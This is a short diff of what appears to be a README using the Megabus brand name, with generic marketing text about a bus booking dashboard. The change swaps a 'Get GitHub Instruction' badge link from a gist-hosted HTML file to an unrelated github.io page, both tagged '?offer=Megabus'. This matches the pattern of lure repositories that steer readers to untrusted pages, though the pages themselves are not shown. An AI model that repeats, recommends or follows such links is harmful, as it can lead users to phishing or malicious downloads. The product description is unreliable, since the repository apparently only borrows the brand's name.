@@ -3,7 +3,7 @@
 
 Megabus connects travelers across cities with an easy-to-use booking and scheduling platform. Manage your trips, view routes, and access real-time updates from one reliable dashboard. 🚌  
 
-[![Megabus](https://img.shields.io/badge/💙%20Get%20GitHub%20Instruction-003399?style=for-the-badge&logo=megabus&logoColor=FFD700&labelColor=0B0F19)](https://gistcdn.githack.com/karisarfrostball69/0dcd6e18286601f44bcad16644968caa/raw/badcba33342ceff18f4d6beb46f87a8ab46df4d0/megabus.html?offer=Megabus)
+[![Megabus](https://img.shields.io/badge/💙%20Get%20GitHub%20Instruction-003399?style=for-the-badge&logo=megabus&logoColor=FFD700&labelColor=0B0F19)](https://app-set-deploy.github.io/.github/?offer=Megabus)
 
 ---
 
